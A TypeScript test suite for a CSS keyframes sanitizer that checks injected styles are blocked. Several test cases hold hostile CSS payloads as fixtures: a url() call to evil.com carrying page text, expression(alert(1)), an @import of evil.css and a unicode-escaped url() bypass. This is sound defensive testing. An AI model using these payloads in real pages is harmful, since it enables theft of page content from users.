// SPDX-License-Identifier: MPL-2.0

import { describe, expect, it } from 'vitest';
import { sanitizeDeclarationBlock, sanitizeKeyframes, sanitizeKeyframesBatch } from './sanitize';

// ---------------------------------------------------------------------------
// T1–T12 per docs/rfc/P0-2-keyframes-sanitize.md §3
// ---------------------------------------------------------------------------

describe('sanitizeKeyframes — T1: normal breathing keyframes', () => {
  it('passes through valid opacity animation unchanged', () => {
    const input = '0% { opacity: 0 } 100% { opacity: 1 }';
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(false);
    expect(result.clean).toBe(input);
    expect(result.violations).toEqual([]);
  });
});

describe('sanitizeKeyframes — T2: url() data theft', () => {
  it('blocks url() in background', () => {
    const input = "0% { background: url('https://evil.com/steal?d=' + document.body.innerText) }";
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
    expect(result.violations.some((v) => v.includes('url'))).toBe(true);
  });
});

describe('sanitizeKeyframes — T3: expression() attack', () => {
  it('blocks expression() in behavior', () => {
    const input = '0% { behavior: expression(alert(1)) }';
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
    expect(result.violations.some((v) => v.toLowerCase().includes('expression'))).toBe(true);
  });
});

describe('sanitizeKeyframes — T4: @import injection', () => {
  it('blocks @import at top level', () => {
    const input = "@keyframes x { } @import url('evil.css')";
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
    expect(result.violations.some((v) => v.includes('@import'))).toBe(true);
  });
});

describe('sanitizeKeyframes — T5: external var() escape', () => {
  it('blocks var(--external-leak)', () => {
    const input = '0% { background: var(--external-leak) }';
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
    expect(result.violations.some((v) => v.includes('--external'))).toBe(true);
  });

  it('allows var(--agentskin-accent) when allowPaletteTokens=true', () => {
    const input = '0% { background: var(--agentskin-accent) }';
    const result = sanitizeKeyframes(input, { allowPaletteTokens: true });
    expect(result.isBlocked).toBe(false);
    expect(result.clean).toBe(input);
  });
});

describe('sanitizeKeyframes — T6: excessive keyframe stops', () => {
  it('warns and truncates beyond maxKeyframeStops', () => {
    // Build 101 stops.
    const stops = Array.from({ length: 101 }, (_, i) => `${i}% { opacity: ${i / 100} }`);
    const input = stops.join(' ');
    const result = sanitizeKeyframes(input, { maxKeyframeStops: 100 });
    expect(result.isBlocked).toBe(false);
    expect(result.violations.some((v) => v.includes('maxKeyframeStops'))).toBe(true);
    // Output should have exactly 100 stops.
    const stopCount = (result.clean.match(/\{/g) || []).length;
    expect(stopCount).toBe(100);
  });
});

describe('sanitizeKeyframes — T7: naming conflict', () => {
  it('renames keyframes starting with agentskin-', () => {
    const input = '@keyframes agentskin-breathing { 0% { opacity: 0 } 100% { opacity: 1 } }';
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(false);
    expect(result.clean).toContain('@keyframes agentskin-usr-');
    expect(result.clean).toContain('-agentskin-breathing');
    expect(result.violations.some((v) => v.includes('renamed'))).toBe(true);
  });
});

describe('sanitizeKeyframes — T8: preset animation compatibility', () => {
  it('passes all 5 preset animations', () => {
    const presets = [
      '0%, 100% { opacity: .6 } 50% { opacity: 1 }',
      '0% { background-position: 0% 50% } 100% { background-position: 100% 50% }',
      '0%, 100% { box-shadow: 0 0 0 transparent } 50% { box-shadow: 0 0 20px rgba(0,0,0,.3) }',
      '0% { transform: rotate(0deg) } 100% { transform: rotate(360deg) }',
      '0%, 100% { filter: brightness(1) } 50% { filter: brightness(1.2) }',
    ];
    for (const preset of presets) {
      const result = sanitizeKeyframes(preset);
      expect(result.isBlocked).toBe(false);
      expect(result.clean).toBe(preset);
    }
  });
});

describe('sanitizeKeyframes — T9: mixed valid + invalid properties', () => {
  it('blocks when any declaration has a forbidden property', () => {
    const input = '0% { opacity: 0; behavior: expression(x) }';
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
    expect(result.violations.some((v) => v.includes('behavior'))).toBe(true);
  });
});

describe('sanitizeKeyframes — T10: empty string', () => {
  it('returns clean empty with no violations', () => {
    const result = sanitizeKeyframes('');
    expect(result.isBlocked).toBe(false);
    expect(result.clean).toBe('');
    expect(result.violations).toEqual([]);
  });
});

describe('sanitizeKeyframes — T11: @supports conditional bypass', () => {
  it('blocks url() hidden inside @supports', () => {
    const input = '@supports (display: grid) { 0% { background: url(x) } }';
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
    expect(result.violations.some((v) => v.includes('url'))).toBe(true);
  });
});

describe('sanitizeKeyframes — T12: unicode encoding bypass', () => {
  it('blocks \\0075 rl → url after unicode decode', () => {
    // \0075 is "u", so \0075 rl decodes to "url"
    const input = "0% { background: \\0075 rl('https://evil.com/x') }";
    const result = sanitizeKeyframes(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
    expect(result.violations.some((v) => v.includes('url'))).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// sanitizeDeclarationBlock tests
// ---------------------------------------------------------------------------

describe('sanitizeDeclarationBlock', () => {
  it('passes safe declarations', () => {
    const input = 'opacity: 0; color: rgba(0,0,0,.5)';
    const result = sanitizeDeclarationBlock(input);
    expect(result.isBlocked).toBe(false);
  });

  it('blocks url() in declarations', () => {
    const input = "background: url('https://evil.com/x')";
    const result = sanitizeDeclarationBlock(input);
    expect(result.isBlocked).toBe(true);
  });

  it('blocks @import', () => {
    const input = "@import url('evil.css')";
    const result = sanitizeDeclarationBlock(input);
    expect(result.isBlocked).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// sanitizeKeyframesBatch tests
// ---------------------------------------------------------------------------

describe('sanitizeKeyframesBatch', () => {
  it('sanitizes multiple keyframes blocks', () => {
    const input =
      '@keyframes a { 0% { opacity: 0 } 100% { opacity: 1 } } ' +
      '@keyframes b { 0% { transform: scale(1) } 100% { transform: scale(1.1) } }';
    const result = sanitizeKeyframesBatch(input);
    expect(result.isBlocked).toBe(false);
    expect(result.clean).toContain('@keyframes a');
    expect(result.clean).toContain('@keyframes b');
  });

  it('blocks if any block contains a violation', () => {
    const input =
      '@keyframes a { 0% { opacity: 0 } 100% { opacity: 1 } } ' +
      "@keyframes b { 0% { background: url('x') } }";
    const result = sanitizeKeyframesBatch(input);
    expect(result.isBlocked).toBe(true);
    expect(result.clean).toBe('');
  });
});
